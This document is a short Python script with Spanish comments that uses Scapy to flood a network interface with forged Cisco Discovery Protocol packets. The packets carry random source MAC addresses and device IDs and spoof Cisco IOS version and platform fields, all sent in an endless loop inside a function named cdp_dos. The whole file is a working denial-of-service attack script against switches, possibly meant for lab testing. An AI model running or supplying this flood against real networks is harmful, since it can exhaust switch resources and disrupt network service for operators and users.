from scapy.all import *
import random
import string

# Importante: Cargar el módulo contrib de CDP explícitamente
load_contrib("cdp")

# Configuración
interface = "eth0"
target_mac = "01:00:0c:cc:cc:cc" 

def random_string(length=8):
    """Genera un string aleatorio"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def cdp_dos():
    print(f"Iniciando inundación CDP en la interfaz {interface}...")
    try:
        while True:
            device_id = random_string(10)
            
            # Construcción del paquete
            # Estructura: Ether -> LLC -> SNAP -> CDP Header -> CDP TLVs (Mensajes)
            pkt = (
                Ether(dst=target_mac, src=RandMAC()) /
                LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                SNAP(OUI=0x00000c, code=0x2000) /
                CDPv2_HDR() /
                CDPMsgDeviceID(val=device_id) /
                CDPMsgSoftwareVersion(val="Cisco IOS Software, Version 15.2") /
                CDPMsgPlatform(val="Cisco Switch") /
                CDPMsgPortID(iface="GigabitEthernet0/1")  # Es común añadir el PortID también
            )
            
            sendp(pkt, iface=interface, verbose=False)
            
    except KeyboardInterrupt:
        print("\nPrueba detenida.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    cdp_dos()
